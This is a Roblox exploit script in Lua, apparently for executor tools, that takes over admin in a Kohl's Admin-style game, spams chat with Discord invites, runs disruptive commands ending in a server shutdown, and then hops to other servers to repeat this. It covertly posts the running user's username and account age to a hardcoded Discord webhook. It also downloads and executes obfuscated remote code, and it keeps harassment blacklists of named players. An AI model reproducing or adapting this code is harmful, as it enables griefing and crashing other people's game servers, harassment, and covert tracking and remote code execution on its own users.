wait(0.4)
function webhooksender(a,b)
local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "trash exploit here"

local url =
   "https://discord.com/api/webhooks/924978517488324608/Ti6Qt9fnIl9EszgtsDdu2HI3JMFMDX36P_1Pj02M2q_qP71pXCdvjPN8zRxEVsI1Gku2"
local data = {
   ["content"] = a,
   ["embeds"] = {
       {
           ["title"] = b,
           ["description"] = "Account age:" .. game.Players.LocalPlayer.AccountAge.. " Username: " .. game.Players.LocalPlayer.Name.." Executed with: **"..webhookcheck.."**",
           ["type"] = "rich",
           ["color"] = tonumber(0xffff),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
end
webhooksender("If they look like a slender or a coolkid, they are getting blacklisted","This guy just executed a crash script lmaoo")
wait(0.001)
local Players = game:GetService("Players")
local HTTPService = game:GetService("HttpService")
local owner = {"The_NootNootLord"}
local whitelisttoggle = true
local whitelisted = {"armnbi","susamongusbkaka","StvrxqzAlt","Damix2131","DamixNeverDies","AGUSTINLVF1","KohlsHouseNBCFix","KohlsH_Angler","jhone_doee110101","TestAccountKRNL","egglnq","TechnoSniperX","TechnoReaperX","TechncReaperX","egglnqalt","The_NootNootLord","leakproof9853"}
local ownertalk = true
local webLink = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
local lol = game.Players.LocalPlayer

function say(msg)
	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
end
wait(0.2)
loadstring(game:HttpGet('https://raw.githubusercontent.com/TheNootNootLord/BRO/main/Obfuscated_2.lua'))()
local blacklistLOL = true
local skid = {"ghghghghghghgh1312","kervenrecate123s123","RejectPlayzYT"} --bully them if you see em xddddd
wait(0.4)


local function serverHop()
    while true do
        local serverList = {}
        for _, v in pairs(HTTPService:JSONDecode(game:HttpGetAsync(webLink)).data) do
            if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
                table.insert(serverList,v.id)
            end
        end

        if #serverList > 0 then
            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, serverList[math.random(1, #serverList)])
            break
        end
    end
end 

wait(0.1)
if whitelisttoggle == true then
    for i,v in pairs(whitelisted) do
        if game.Players:FindFirstChild(v) then
          say("(NootNoot script user)Your server was spared due to the whitelisted user found: "..v)
          wait(0.2)
          while wait(0.3) do
          task.spawn(serverHop)
          end
        end
    end
end


wait(0.1)
if ownertalk == true then
    for i,v in pairs(owner) do
        if game.Players:FindFirstChild(v) then
          say("(NootNoot script user)The owner of the NootNoot script is in the server: "..v)
          end
        end
    end


wait(0.1)
if blacklistLOL == true then
    for i,v in pairs(skid) do
        if game.Players:FindFirstChild(v) then
          say("(Blacklisted NootNoot script user)ohh~ yesss~~~ i got blacklisted uwu")
		wait(1.6)
		game:shutdown()
          end
        end
    end



local root = game.Players.LocalPlayer.Character.HumanoidRootPart
root.Anchored = true
repeat 
wait()
root.CFrame = CFrame.new(-7.165, root.Position.Y+2000 , 94.743)
until workspace.Terrain._Game.Admin:FindFirstChild("Regen")
root.Anchored = false
root.CFrame = workspace.Terrain._Game.Admin:FindFirstChild("Regen").CFrame + Vector3.new(0,3,0)
wait(0.2)

wait(0.1)
print("no whitelisted people found D:")
wait(0.2)
game.Players:Chat(".loopgrab all")
game.Players:Chat(".regen")
game.Players:Chat(":fix")
wait(0.01)
game.Players:Chat(":respawn others")
game.Players:Chat(":music 142912516")
wait(0.001)
game.Players:Chat("fogstart 0")
game.Players:Chat("time 120")
wait(0.001)
game.Players:Chat("fogend 0")
game.Players:Chat("fogcolor 0 0 0")
wait(0.001)
game.Players:Chat("punish others")
wait(0.1)
say("brooo no wayyy CoolKids put me in their hall of clowns no wayyyyy fr??? broooo imma cry real quick, brooooo")
wait(0.3)
game.Players:Chat('h \n \n \n \n \n \n \n \n \n \n \n \n Noot Noot!!! #  5 80 1')
wait(0.2)
game.Players:Chat('h \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n Your server was destroyed by The Noot Noot Lord ')
wait(0.2)
game.Players:Chat('h \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n Join the server if you want the script')
wait(0.2)
game.Players:Chat('h \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n de s k or d . gg/ kK Eq but way')
wait(0.2)
game.Players:Chat('h \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n  And join THIS server if you wanna talk to me and stuff')
wait(0.2)
game.Players:Chat('h \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n  desk o rd . gg/ PAT nx vQ 9 Se')
wait(0.2)
game.Players:Chat('h \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n CoolKid on bottom, NootNoot on second, NoobSploi_t on TOP, CRY ABOUT IT
game.Players:Chat(".shutdown")

wait(6) -- this is to prevent server hopping instantly lol


while wait(0.3) do
    task.spawn(serverHop)
end
